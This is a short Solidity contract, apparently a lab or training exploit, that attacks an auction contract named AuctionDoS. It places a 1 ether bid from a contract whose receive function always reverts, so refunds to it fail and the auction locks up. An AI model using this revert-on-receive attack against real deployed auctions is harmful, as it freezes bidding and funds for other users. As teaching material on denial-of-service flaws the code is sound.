// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {AuctionDoS} from "../src/AuctionDoS.sol";

contract ExploitModule {
    AuctionDoS public targetContract;

    constructor(address _target) payable {
        targetContract = AuctionDoS(payable(_target));
    }

    function runExploit() external payable {
        // Place the first bid with the malicious bidder
        targetContract.bid{value: 1 ether}();
    }

    receive() external payable {
        // Malicious bidder: revert on any ETH received
        revert();
    }
}